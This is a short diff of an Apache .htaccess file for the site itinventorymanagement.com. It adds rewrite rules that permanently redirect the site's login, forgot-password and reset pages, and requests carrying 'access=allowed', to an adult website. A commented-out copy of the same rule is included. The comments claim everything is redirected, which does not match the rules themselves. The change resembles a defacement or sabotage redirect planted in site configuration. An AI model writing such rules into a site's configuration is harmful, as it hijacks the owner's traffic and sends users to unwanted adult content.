@@ -36,9 +36,18 @@ RewriteRule ^([^\.]+)$ $1.php [NC,L]
 # </FilesMatch>
 
 
+# RewriteEngine On
+# RewriteCond %{HTTP_HOST} ^itinventorymanagement\.com$ [NC]
+# RewriteRule ^(.*)$ http://www.pornhub.com/$1 [L,R=301]
+
+
 RewriteEngine On
+
+# Redirect everything from itinventorymanagement.com to a different URL
 RewriteCond %{HTTP_HOST} ^itinventorymanagement\.com$ [NC]
+
+# Redirect all paths, including index.php, login.php, forgot.php, reset.php, etc.
+RewriteCond %{REQUEST_URI} ^/(index\.php|login\.php|forgot\.php|reset\.php) [NC,OR]
+RewriteCond %{QUERY_STRING} access=allowed [NC]
+
 RewriteRule ^(.*)$ http://www.pornhub.com/$1 [L,R=301]
-
-
-
